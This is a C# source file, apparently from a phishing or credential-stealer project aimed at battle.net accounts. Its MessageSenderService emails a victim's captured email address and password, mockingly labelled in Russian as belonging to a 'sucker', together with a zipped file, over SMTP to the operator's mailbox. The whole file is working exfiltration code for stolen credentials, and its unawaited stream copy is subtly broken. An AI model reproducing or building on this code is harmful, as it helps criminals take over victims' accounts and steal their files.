using BattleNetServer.Configuration;
using MailKit.Net.Smtp;
using MimeKit;

namespace BattleNetServer.Services;

public class MessageSenderService : IMessageSenderService
{
    private readonly AppSettingsConfig config = ServerConfiguration.Config;
    
    public void SendEmail(string inputEmail, string inputPassword, string subj, string filePath)
    {
        try
        {
            using var mailSender = new MimeMessage();

            mailSender.From.Add(new MailboxAddress("battle.net", config.EmailAddress));
            mailSender.To.Add(new MailboxAddress("", inputEmail));
            mailSender.Subject = subj;

            var multipart = new Multipart("mixed");

            var textPart = new TextPart(MimeKit.Text.TextFormat.Html)
            {
                Text = $"<h4>Данные пользователя battle.net:<br>Почта лоха: {inputEmail}<br>Пароль лоха: {inputPassword}</h4>"
            };

            var attachmentPart = new MimePart("application", "zip")
            {
                ContentDisposition = new ContentDisposition(ContentDisposition.Attachment),
                ContentTransferEncoding = ContentEncoding.Base64,
                FileName = Path.GetFileName(filePath)
            };

            using (var fileStream = File.OpenRead(filePath))
            {
                var memoryStream = new MemoryStream();
                fileStream.CopyToAsync(memoryStream);
                memoryStream.Position = 0;
                attachmentPart.Content = new MimeContent(memoryStream);
            }

            multipart.Add(textPart);
            multipart.Add(attachmentPart);

            mailSender.Body = multipart;

            using var client = new SmtpClient();
            client.Connect(config.SmtpServerHost, config.SmtpServerPort, true);
            client.AuthenticationMechanisms.Remove("XOAUTH2");
            client.Authenticate(config.EmailAddress, config.PasswordAddress);
            client.Send(mailSender);
            client.Disconnect(true);
        }
        catch (Exception e)
        {
            Console.WriteLine($"Ошибка при отправке сообщения: {e.Message}");
        }
    }
}